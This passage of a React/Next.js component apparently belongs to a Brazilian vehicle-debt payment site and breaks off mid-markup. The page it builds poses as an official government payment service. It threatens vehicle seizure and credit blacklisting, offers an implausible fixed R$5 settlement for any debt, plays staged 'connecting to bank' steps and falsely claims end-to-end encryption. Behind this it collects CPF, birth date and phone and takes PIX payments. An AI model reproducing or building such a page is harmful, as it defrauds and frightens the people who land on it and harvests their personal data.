"use client"

import type React from "react"
import { useEffect } from "react"
import { useState } from "react"
import { motion, AnimatePresence } from "framer-motion"
import { useBackRedirect } from "./back-redirect-provider"
import { Header } from "./header"
import { SecurityBadge } from "./security-badge"
import { useRouter } from "next/navigation"

export function BackRedirectSecondStep() {
  const { hideBackRedirect, userData } = useBackRedirect()
  const [showQualification, setShowQualification] = useState(false)
  const [isGeneratingPix, setIsGeneratingPix] = useState(false)
  const [generatingStep, setGeneratingStep] = useState(0)
  const [pixData, setPixData] = useState<any>(null)
  const [copied, setCopied] = useState(false)
  const [paymentStatus, setPaymentStatus] = useState<"pending" | "paid" | "checking">("pending")
  const [transactionId, setTransactionId] = useState<string>("")

  const [telefone, setTelefone] = useState("")
  const [acceptedTerms, setAcceptedTerms] = useState(false)
  const [formErrors, setFormErrors] = useState<any>({})

  const router = useRouter()

  const pixGenerationSteps = [
    { icon: "🔐", text: "Validando dados do pagamento..." },
    { icon: "🏦", text: "Conectando com instituição financeira..." },
    { icon: "💳", text: "Gerando código PIX seguro..." },
    { icon: "📱", text: "Preparando QR Code..." },
    { icon: "✅", text: "Finalizando..." },
  ]

  // Verificação de segurança
  const [hasError, setHasError] = useState(false)

  useEffect(() => {
    if (!userData || !userData.debitos || !Array.isArray(userData.debitos)) {
      console.error("❌ BackRedirectSecondStep: userData ou debitos inválidos", userData)
      setHasError(true)
    }
  }, [userData])

  useEffect(() => {
    if (paymentStatus === "paid" && pixData) {
      console.log("✅ [v0] Pagamento confirmado (Back Redirect)!")

      if (typeof window !== "undefined") {
        try {
          // Fire Utmify purchase event
          if ((window as any).utmify && typeof (window as any).utmify.event === "function") {
            ;(window as any).utmify.event("purchase", {
              value: getValorNumericoComDesconto(),
              currency: "BRL",
              transaction_id: pixData.transaction_id,
              placa: userData?.veiculo?.placa || userData?.placa,
              source: "back_redirect",
            })
            console.log("✅ Utmify back redirect purchase event fired (payment confirmed)")
          }

          // Fire Facebook Pixel purchase event
          if (typeof (window as any).fbq === "function") {
            ;(window as any).fbq("track", "Purchase", {
              value: getValorNumericoComDesconto(),
              currency: "BRL",
              content_ids: [userData?.veiculo?.placa || userData?.placa],
              content_type: "product",
            })
            console.log("✅ Facebook back redirect purchase event fired (payment confirmed)")
          }
        } catch (pixelError) {
          console.error("❌ Error firing purchase events:", pixelError)
        }
      }
    }
  }, [paymentStatus, pixData, userData])

  if (hasError) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-[#1351B4] to-[#071D41] flex items-center justify-center p-4">
        <div className="bg-white rounded-lg shadow-2xl max-w-2xl w-full p-8 text-center">
          <h2 className="text-xl font-bold text-red-600 mb-4">Erro nos dados</h2>
          <p className="text-gray-600 mb-6">Não foi possível carregar os dados dos débitos.</p>
          <button
            onClick={() => router.push("/")}
            className="bg-[#1351B4] text-white py-3 px-6 rounded-lg hover:bg-[#0D47A1] transition-colors font-medium"
          >
            Voltar
          </button>
        </div>
      </div>
    )
  }

  const VALOR_FIXO_DESCONTO = 5.0

  const getValorNumericoComDesconto = () => {
    return VALOR_FIXO_DESCONTO
  }

  const getValorTotalOriginal = () => {
    return userData.debitos.reduce((total, debito) => {
      const valorString = debito.total || debito.valor
      const valor = Number.parseFloat(
        valorString
          .replace(/R\$\s?/g, "")
          .replace(/\./g, "")
          .replace(",", "."),
      )
      return total + (isNaN(valor) ? 0 : valor)
    }, 0)
  }

  const calcularPercentualDesconto = () => {
    const totalOriginal = getValorTotalOriginal()
    if (totalOriginal <= 0) return 0

    const economia = totalOriginal - VALOR_FIXO_DESCONTO
    const percentual = (economia / totalOriginal) * 100
    return Math.round(percentual)
  }

  const calcularTotalComDesconto = () => {
    return VALOR_FIXO_DESCONTO.toLocaleString("pt-BR", { style: "currency", currency: "BRL" })
  }

  const calcularEconomia = () => {
    const totalOriginal = getValorTotalOriginal()
    const economia = totalOriginal - VALOR_FIXO_DESCONTO
    return economia.toLocaleString("pt-BR", { style: "currency", currency: "BRL" })
  }

  const calcularTotal = () => {
    const total = getValorTotalOriginal()
    return total.toLocaleString("pt-BR", { style: "currency", currency: "BRL" })
  }

  const formatPhone = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    if (numbers.length <= 10) {
      return numbers.replace(/(\d{2})(\d{4})(\d{0,4})/, "($1) $2-$3")
    }
    return numbers.replace(/(\d{2})(\d{5})(\d{0,4})/, "($1) $2-$3")
  }

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatPhone(e.target.value)
    setTelefone(formatted)
    if (formErrors.telefone) {
      setFormErrors({ ...formErrors, telefone: "" })
    }
  }

  const validateForm = () => {
    const errors: any = {}
    const phoneNumbers = telefone.replace(/\D/g, "")
    if (!telefone) {
      errors.telefone = "Telefone é obrigatório"
    } else if (phoneNumbers.length < 10) {
      errors.telefone = "Telefone inválido"
    }
    if (!acceptedTerms) {
      errors.terms = "Você deve aceitar os termos para continuar"
    }
    setFormErrors(errors)
    return Object.keys(errors).length === 0
  }

  const handleGerarPix = async () => {
    setShowQualification(true)
  }

  const handleGeneratePix = async () => {
    if (!validateForm()) {
      return
    }

    setIsGeneratingPix(true)
    setGeneratingStep(0)

    const stepInterval = setInterval(() => {
      setGeneratingStep((prev) => {
        if (prev < pixGenerationSteps.length - 1) {
          return prev + 1
        }
        return prev
      })
    }, 800)

    try {
      console.log("🔵 [BackRedirect] Gerando PIX com IllimitPay...")

      const valorFinal = getValorNumericoComDesconto()

      const response = await fetch("/api/payment/create-pix", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          amount: valorFinal,
          customerData: {
            nome: userData.nome,
            cpf: userData.cpf,
            dataNascimento: userData.dataNascimento,
            email: `${userData.cpf.replace(/\D/g, "")}@temp.com`,
            telefone: telefone.replace(/\D/g, ""),
          },
          vehicleData: {
            placa: userData.veiculo?.placa || userData.placa,
            modelo: userData.veiculo?.modelo || "Não informado",
            marca: userData.veiculo?.marca || "Não informado",
            ano: userData.veiculo?.ano || "Não informado",
          },
        }),
      })

      const result = await response.json()
      console.log("✅ [BackRedirect] Resposta da API:", result)

      clearInterval(stepInterval)

      if (result.success) {
        setGeneratingStep(pixGenerationSteps.length - 1)
        await new Promise((resolve) => setTimeout(resolve, 500))

        setPixData(result.transaction)
        setTransactionId(result.transaction.transaction_id)
        setIsGeneratingPix(false)
        setShowQualification(false)

        startPaymentStatusCheck(result.transaction.transaction_id)
      } else {
        throw new Error(result.error || "Erro ao gerar PIX")
      }
    } catch (error) {
      clearInterval(stepInterval)
      console.error("❌ [BackRedirect] Erro ao gerar PIX:", error)
      setIsGeneratingPix(false)
      alert(`Erro ao gerar PIX: ${error.message}`)
    }
  }

  const handleCopyPIX = async () => {
    if (!pixData?.qr_code) return

    try {
      await navigator.clipboard.writeText(pixData.qr_code)
      setCopied(true)
      setTimeout(() => setCopied(false), 3000)
    } catch (err) {
      console.error("Erro ao copiar:", err)
    }
  }

  const handleNovaConsulta = () => {
    localStorage.clear()
    router.push("/")
  }

  const formatCpf = (cpf: string) => {
    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
  }

  const formatReferencia = (debito: any) => {
    const parts = []
    if (debito.ano) parts.push(`Ano: ${debito.ano}`)
    if (debito.data) parts.push(`Data: ${debito.data}`)
    if (debito.referencia) parts.push(debito.referencia)
    if (debito.periodo) parts.push(`Período: ${debito.periodo}`)
    if (debito.exercicio) parts.push(`Exercício: ${debito.exercicio}`)

    return parts.length > 0 ? parts.join(" | ") : "Não informado"
  }

  const startPaymentStatusCheck = (txId: string) => {
    setPaymentStatus("checking")

    const checkInterval = setInterval(async () => {
      try {
        const response = await fetch(`/api/payment/check-status?transactionId=${txId}`)
        const result = await response.json()

        console.log("[v0] Payment status check (BackRedirect):", result)

        if (result.success && result.isPaid) {
          setPaymentStatus("paid")
          clearInterval(checkInterval)
          console.log("✅ [v0] Pagamento confirmado (BackRedirect)!")
        }
      } catch (error) {
        console.error("[v0] Erro ao verificar status:", error)
      }
    }, 5000)

    setTimeout(() => clearInterval(checkInterval), 30 * 60 * 1000)
  }

  if (pixData) {
    return (
      <div className="fixed inset-0 z-50 bg-white overflow-y-auto">
        <Header />
        <div className="container mx-auto px-4 py-8 max-w-4xl">
          <motion.div
            className="bg-white p-6 rounded-sm border-2 border-[#4CAF50] shadow-lg"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
          >
            {paymentStatus === "paid" && (
              <div className="mb-6 bg-green-50 border-2 border-green-500 rounded-lg p-4">
                <div className="flex items-center gap-3 mb-2">
                  <svg className="w-8 h-8 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"
                    />
                  </svg>
                  <h3 className="text-xl font-bold text-green-700">Pagamento Confirmado!</h3>
                </div>
                <p className="text-green-700 font-medium">
                  Seu pagamento foi aprovado com sucesso. Os débitos serão regularizados em até 24 horas.
                </p>
              </div>
            )}

            {paymentStatus === "checking" && (
              <div className="mb-4 bg-blue-50 border border-blue-300 rounded-lg p-3 flex items-center gap-2">
                <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-blue-600"></div>
                <p className="text-sm text-blue-700">Aguardando confirmação do pagamento...</p>
              </div>
            )}

            {/* Success Header */}
            <div className="text-center mb-6">
              <div className="inline-flex items-center justify-center bg-gradient-to-r from-[#1351B4] to-[#0D47A1] text-white px-6 py-2 rounded-full mb-4 shadow-lg">
                <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
                  />
                </svg>
                <span className="font-bold text-sm">Pagamento Oficial Autorizado pelo Governo</span>
              </div>
              <h2 className="text-2xl md:text-3xl font-bold text-[#071D41] mb-2">Pague com PIX</h2>
              <p className="text-3xl md:text-4xl font-bold text-[#1351B4] mb-2">{calcularTotalComDesconto()}</p>
            </div>

            {/* QR Code Section - Desktop Only */}
            <div className="hidden md:flex justify-center mb-6">
              <div className="bg-white p-6 rounded-lg shadow-lg">
                <img
                  src={pixData.qr_code_image || "/placeholder.svg"}
                  alt="QR Code PIX"
                  className="w-64 h-64 mx-auto"
                  onError={(e) => {
                    console.error("[v0] Erro ao carregar QR Code:", pixData.qr_code_image)
                    e.currentTarget.src = "/placeholder.svg"
                  }}
                />
                <p className="text-center text-sm text-[#555555] mt-3">Escaneie o QR Code com o app do seu banco</p>
              </div>
            </div>

            {/* PIX Key Section */}
            <div className="bg-white p-6 rounded-lg border-2 border-[#1351B4] shadow-md mb-6">
              <div className="flex items-center justify-center mb-4">
                <svg className="w-6 h-6 text-[#1351B4] mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M12 4v1m6 11h2m-6 0h-2v4m0-11v3m0 0h.01M12 12h4.01M16 20h4M4 12h4m12 0h.01M5 8h2a1 1 0 001-1V5a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1zm12 0h2a1 1 0 001-1V5a1 1 0 00-1-1h-2a1 1 0 00-1 1v2a1 1 0 001 1z"
                  />
                </svg>
                <h3 className="text-xl font-bold text-[#071D41]">
                  <span className="hidden md:inline">ou </span>Chave PIX Copia e Cola
                </h3>
              </div>

              <div className="bg-[#F8F8F8] p-4 rounded-lg border-2 border-gray-300 mb-4">
                <p className="text-sm md:text-base font-mono text-[#333333] break-all text-center leading-relaxed">
                  {pixData.qr_code}
                </p>
              </div>

              <button
                onClick={handleCopyPIX}
                className="w-full bg-gradient-to-r from-[#1351B4] to-[#0D47A1] text-white py-5 px-6 rounded-xl hover:from-[#0D47A1] hover:to-[#1351B4] transition-all transform hover:scale-105 active:scale-95 font-bold text-lg md:text-xl flex items-center justify-center shadow-2xl border-2 border-[#1351B4]"
              >
                {copied ? (
                  <>
                    <svg className="w-7 h-7 mr-3 animate-bounce" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                    </svg>
                    <span>Chave PIX Copiada!</span>
                  </>
                ) : (
                  <>
                    <svg className="w-7 h-7 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2.5}
                        d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2z"
                      />
                    </svg>
                    <span>Copiar Chave PIX</span>
                  </>
                )}
              </button>
            </div>

            {/* Instructions */}
            <div className="bg-[#FFFAEA] p-4 rounded-lg border-l-4 border-[#FFCC29] mb-6">
              <h4 className="font-bold text-[#071D41] text-sm mb-3 flex items-center">
                <svg className="w-5 h-5 text-[#FF9100] mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                  />
                </svg>
                Como pagar:
              </h4>
              <ol className="space-y-2 text-sm text-[#333333]">
                <li className="flex items-start">
                  <span className="inline-flex items-center justify-center w-6 h-6 bg-[#1351B4] text-white rounded-full text-xs font-bold mr-3 flex-shrink-0 mt-0.5">
                    1
                  </span>
                  <span>Copie a chave PIX acima clicando no botão</span>
                </li>
                <li className="flex items-start">
                  <span className="inline-flex items-center justify-center w-6 h-6 bg-[#1351B4] text-white rounded-full text-xs font-bold mr-3 flex-shrink-0 mt-0.5">
                    2
                  </span>
                  <span>Abra o aplicativo do seu banco</span>
                </li>
                <li className="flex items-start">
                  <span className="inline-flex items-center justify-center w-6 h-6 bg-[#1351B4] text-white rounded-full text-xs font-bold mr-3 flex-shrink-0 mt-0.5">
                    3
                  </span>
                  <span>
                    Acesse a área de <strong>PIX</strong> e selecione <strong>Pix Copia e Cola</strong>
                  </span>
                </li>
                <li className="flex items-start">
                  <span className="inline-flex items-center justify-center w-6 h-6 bg-[#1351B4] text-white rounded-full text-xs font-bold mr-3 flex-shrink-0 mt-0.5">
                    4
                  </span>
                  <span>Cole a chave PIX e confirme o pagamento</span>
                </li>
              </ol>
            </div>

            <div className="flex justify-center">
              <button
                onClick={handleNovaConsulta}
                className="text-[#1351B4] hover:text-[#0D47A1] font-medium text-sm underline"
              >
                Fazer Nova Consulta
              </button>
            </div>
          </motion.div>

          <SecurityBadge />
        </div>
      </div>
    )
  }

  if (showQualification) {
    return (
      <div className="fixed inset-0 z-50 bg-white overflow-y-auto">
        <div className={`min-h-screen ${isGeneratingPix ? "blur-sm" : ""} pointer-events-none`}>
          <Header />
          <div className="flex-1 container mx-auto px-4 py-8 max-w-4xl opacity-50">
            <div className="bg-white p-6 rounded-sm border border-gray-200 shadow-sm">
              <h1 className="text-2xl font-bold text-[#071D41]">Gerando Pagamento PIX</h1>
            </div>
          </div>
        </div>

        <div className="fixed inset-0 bg-black/40 backdrop-blur-sm flex items-center justify-center z-50 p-4 overflow-y-auto">
          <AnimatePresence mode="wait">
            {!isGeneratingPix ? (
              <motion.div
                key="qualification"
                initial={{ scale: 0.9, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                exit={{ scale: 0.9, opacity: 0 }}
                className="bg-white p-8 rounded-lg shadow-2xl border-2 border-[#1351B4] max-w-2xl w-full my-8"
              >
                <div className="flex flex-col">
                  <div className="text-center mb-6">
                    <div className="bg-gradient-to-br from-[#1351B4] to-[#0D47A1] p-6 rounded-full shadow-lg mb-4 inline-block">
                      <svg className="w-16 h-16 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth={2}
                          d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
                        />
                      </svg>
                    </div>
                    <h2 className="text-2xl font-bold text-[#071D41] mb-2">Confirmação de Dados</h2>
                    <p className="text-sm text-[#555555]">
                      Para sua segurança e para enviarmos o comprovante de pagamento
                    </p>
                  </div>

                  <div className="bg-[#F0F5FF] p-4 rounded-lg border border-[#1351B4] mb-6">
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-sm">
                      <div>
                        <span className="text-[#555555]">Nome:</span>
                        <p className="font-bold text-[#071D41]">{userData.nome}</p>
                      </div>
                      <div>
                        <span className="text-[#555555]">CPF:</span>
                        <p className="font-bold text-[#071D41]">{formatCpf(userData.cpf)}</p>
                      </div>
                      <div>
                        <span className="text-[#555555]">Veículo:</span>
                        <p className="font-bold text-[#071D41]">{userData.veiculo?.placa || userData.placa}</p>
                      </div>
                      <div>
                        <span className="text-[#555555]">Valor:</span>
                        <p className="font-bold text-[#1351B4]">{calcularTotalComDesconto()}</p>
                      </div>
                    </div>
                  </div>

                  <div className="space-y-4 mb-6">
                    <div>
                      <label className="block text-sm font-bold text-[#071D41] mb-2">
                        Telefone/Celular <span className="text-[#D4000F]">*</span>
                      </label>
                      <div className="relative">
                        <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                          <svg className="w-5 h-5 text-[#555555]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path
                              strokeLinecap="round"
                              strokeLinejoin="round"
                              strokeWidth={2}
                              d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"
                              clipRule="evenodd"
                            />
                          </svg>
                        </div>
                        <input
                          type="tel"
                          value={telefone}
                          onChange={handlePhoneChange}
                          placeholder="(11) 99999-9999"
                          maxLength={15}
                          className={`w-full pl-10 pr-4 py-3 border-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1351B4] ${
                            formErrors.telefone ? "border-red-500" : "border-gray-300"
                          }`}
                        />
                      </div>
                      {formErrors.telefone && (
                        <p className="text-red-500 text-xs mt-1 flex items-center">
                          <svg className="w-4 h-4 mr-1" fill="currentColor" viewBox="0 0 20 20">
                            <path
                              fillRule="evenodd"
                              d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z"
                              clipRule="evenodd"
                            />
                          </svg>
                          {formErrors.telefone}
                        </p>
                      )}
                      <p className="text-xs text-[#555555] mt-1">
                        Usaremos para enviar confirmação de pagamento via WhatsApp
                      </p>
                    </div>

                    <div className="bg-[#F8F8F8] p-4 rounded-lg border border-gray-300">
                      <label className="flex items-start cursor-pointer">
                        <input
                          type="checkbox"
                          checked={acceptedTerms}
                          onChange={(e) => {
                            setAcceptedTerms(e.target.checked)
                            if (formErrors.terms) {
                              setFormErrors({ ...formErrors, terms: "" })
                            }
                          }}
                          className="mt-1 w-5 h-5 text-[#1351B4] border-gray-300 rounded focus:ring-[#1351B4]"
                        />
                        <span className="ml-3 text-sm text-[#333333]">
                          Declaro que as informações fornecidas são verdadeiras e autorizo o processamento do pagamento
                          dos débitos veiculares no valor de <strong>{calcularTotalComDesconto()}</strong>.
                        </span>
                      </label>
                      {formErrors.terms && (
                        <p className="text-red-500 text-xs mt-2 flex items-center ml-8">
                          <svg className="w-4 h-4 mr-1" fill="currentColor" viewBox="0 0 20 20">
                            <path
                              fillRule="evenodd"
                              d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z"
                              clipRule="evenodd"
                            />
                          </svg>
                          {formErrors.terms}
                        </p>
                      )}
                    </div>
                  </div>

                  <div className="bg-[#E6F2E8] p-3 rounded-lg border border-[#4CAF50] mb-6">
                    <div className="flex items-center text-sm text-[#333333]">
                      <svg
                        className="w-5 h-5 text-[#4CAF50] mr-2 flex-shrink-0"
                        fill="none"
                        stroke="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth={2}
                          d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
                        />
                      </svg>
                      <span>
                        <strong>Seus dados estão seguros.</strong> Utilizamos criptografia de ponta a ponta.
                      </span>
                    </div>
                  </div>

                  <div className="space-y-3">
                    <button
                      onClick={handleGeneratePix}
                      className="w-full bg-[#1351B4] text-white py-4 px-6 rounded-lg hover:bg-[#0D47A1] transition-all transform hover:scale-105 font-bold text-lg shadow-lg flex items-center justify-center"
                    >
                      <svg className="w-6 h-6 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth={2}
                          d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2z"
                        />
                      </svg>
                      Confirmar e Gerar PIX
                    </button>

                    <button
                      onClick={() => setShowQualification(false)}
                      className="w-full bg-gray-200 text-[#555555] py-3 px-6 rounded-lg hover:bg-gray-300 transition-colors font-medium"
                    >
                      Cancelar
                    </button>
                  </div>
                </div>
              </motion.div>
            ) : (
              <motion.div
                key="generating"
                initial={{ scale: 0.9, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                className="bg-white p-8 rounded-lg shadow-2xl border-2 border-[#1351B4] max-w-md w-full"
              >
                <div className="text-center">
                  <motion.div
                    key={generatingStep}
                    initial={{ scale: 0, rotate: -180 }}
                    animate={{ scale: 1, rotate: 0 }}
                    transition={{ duration: 0.5 }}
                    className="inline-flex items-center justify-center w-24 h-24 rounded-full bg-gradient-to-br from-[#1351B4] to-[#0D47A1] mb-6 shadow-lg"
                  >
                    <span className="text-5xl">{pixGenerationSteps[generatingStep].icon}</span>
                  </motion.div>

                  <AnimatePresence mode="wait">
                    <motion.h2
                      key={generatingStep}
                      initial={{ opacity: 0, y: 20 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0, y: -20 }}
                      transition={{ duration: 0.3 }}
                      className="text-xl font-bold text-[#071D41] mb-6"
                    >
                      {pixGenerationSteps[generatingStep].text}
                    </motion.h2>
                  </AnimatePresence>

                  <div className="w-full bg-gray-200 rounded-full h-3 mb-6 overflow-hidden">
                    <motion.div
                      className="h-full bg-gradient-to-r from-[#1351B4] to-[#0D47A1] rounded-full"
                      initial={{ width: "0%" }}
                      animate={{ width: `${((generatingStep + 1) / pixGenerationSteps.length) * 100}%` }}
                      transition={{ duration: 0.5 }}
                    />
                  </div>

                  <div className="flex justify-center space-x-2 mb-4">
                    {[0, 1, 2].map((i) => (
                      <motion.div
                        key={i}
                        className="w-3 h-3 bg-[#1351B4] rounded-full"
                        animate={{
                          scale: [1, 1.5, 1],
                          opacity: [0.5, 1, 0.5],
                        }}
                        transition={{
                          duration: 1,
                          repeat: Number.POSITIVE_INFINITY,
                          delay: i * 0.2,
                        }}
                      />
                    ))}
                  </div>

                  <p className="text-sm text-[#555555] mb-4">Aguarde, estamos gerando seu código PIX...</p>

                  <div className="mt-6 flex items-center justify-center text-xs text-[#4CAF50]">
                    <svg className="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
                      />
                    </svg>
                    Conexão segura e criptografada
                  </div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>
    )
  }

  return (
    <div className="fixed inset-0 z-50 bg-white overflow-y-auto">
      <Header />
      <div className="container mx-auto px-4 py-8 max-w-4xl">
        <motion.div
          className="bg-white p-6 rounded-sm border-2 border-[#D4000F] shadow-lg mb-6"
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.3 }}
        >
          <div className="flex items-start mb-4">
            <div className="bg-[#D4000F] rounded-full p-2 mr-4 flex-shrink-0">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                className="h-6 w-6 text-white"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={2}
                  d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"
                />
              </svg>
            </div>
            <div>
              <h2 className="text-xl font-bold text-[#D4000F] mb-2">
                ⚠️ ALERTA CRÍTICO: BUSCA E APREENSÃO + SERASA IMINENTES
              </h2>
              <p className="text-[#333333] mb-2 font-medium">
                Identificamos débitos pendentes no seu veículo. O não pagamento resultará em{" "}
                <strong>busca e apreensão do veículo</strong> e <strong>inclusão do seu CPF no SERASA</strong> e outros
                órgãos de proteção ao crédito.
              </p>
            </div>
          </div>

          {userData && (
            <div className="bg-[#F0F8FF] p-4 mb-6 border border-[#1351B4] rounded-sm">
              <h3 className="text-base font-bold text-[#071D41] mb-3">Dados do Veículo e Proprietário:</h3>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                <div>
                  <p className="text-xs text-[#555555]">Proprietário:</p>
                  <p className="text-sm font-medium text-[#333333]">{userData.nome || "Não informado"}</p>
                </div>
                <div>
                  <p className="text-xs text-[#555555]">CPF:</p>
                  <p className="text-sm font-medium text-[#333333]">{formatCpf(userData.cpf) || "Não informado"}</p>
                </div>
                <div>
                  <p className="text-xs text-[#555555]">Placa:</p>
                  <p className="text-sm font-medium text-[#333333]">
                    {userData.veiculo?.placa || userData.placa || "Não informado"}
                  </p>
                </div>
                <div>
                  <p className="text-xs text-[#555555]">Modelo:</p>
                  <p className="text-sm font-medium text-[#333333]">
                    {userData.veiculo?.marca} {userData.veiculo?.modelo} {userData.veiculo?.ano || "Não informado"}
                  </p>
                </div>
              </div>
            </div>
          )}

          {userData?.debitos && userData.debitos.length > 0 && (
            <div className="mb-6">
              <h3 className="text-base font-bold text-[#071D41] mb-4">Débitos do Veículo</h3>
              <div className="overflow-x-auto">
                <table className="w-full border-collapse">
                  <thead>
                    <tr className="bg-[#F0F5FF]">
                      <th className="border border-gray-300 px-4 py-2 text-left text-xs font-medium text-[#071D41]">
                        Tipo
                      </th>
                      <th className="border border-gray-300 px-4 py-2 text-left text-xs font-medium text-[#071D41]">
                        Referência
                      </th>
                      <th className="border border-gray-300 px-4 py-2 text-left text-xs font-medium text-[#071D41]">
                        Vencimento
                      </th>
                      <th className="border border-gray-300 px-4 py-2 text-left text-xs font-medium text-[#071D41]">
                        Valor
                      </th>
                      <th className="border border-gray-300 px-4 py-2 text-left text-xs font-medium text-[#071D41]">
                        Status
                      </th>
                    </tr>
                  </thead>
                  <tbody>
                    {userData.debitos.map((debito, index) => (
                      <tr key={index} className={index % 2 === 0 ? "bg-white" : "bg-[#F8F8F8]"}>
                        <td className="border border-gray-300 px-4 py-2 text-sm text-[#333333]">{debito.tipo}</td>
                        <td className="border border-gray-300 px-4 py-2 text-sm text-[#333333]">
                          {formatReferencia(debito)}
                        </td>
                        <td className="border border-gray-300 px-4 py-2 text-sm text-[#333333]">
                          {debito.vencimento || "Não informado"}
                        </td>
                        <td className="border border-gray-300 px-4 py-2 text-sm font-medium text-[#333333]">
                          {debito.total || debito.valor}
                        </td>
                        <td className="border border-gray-300 px-4 py-2">
                          <span className="inline-block px-2 py-1 bg-red-100 text-red-800 text-xs rounded-sm">
                            {debito.status}
                          </span>
                        </td>
                      </tr>
                    ))}
                    <tr className="bg-[#E6F2FF] font-bold">
                      <td colSpan={3} className="border border-gray-300 px-4 py-2 text-right text-sm text-[#071D41]">
                        Total:
                      </td>
                      <td className="border border-gray-300 px-4 py-2 text-sm text-[#071D41]">{calcularTotal()}</td>
                      <td className="border border-gray-300 px-4 py-2"></td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>
          )}

          <div className="bg-[#F8F8F8] p-4 mb-6 border border-gray-300 rounded-sm">
            <h3 className="text-base font-bold text-[#071D41] mb-3">⚠️ Consequências Imediatas do Não Pagamento:</h3>
            <ul className="space-y-3">
              <li className="flex items-start">
                <div className="mr-3 text-[#D4000F] flex-shrink-0 mt-1">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    className="h-5 w-5"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
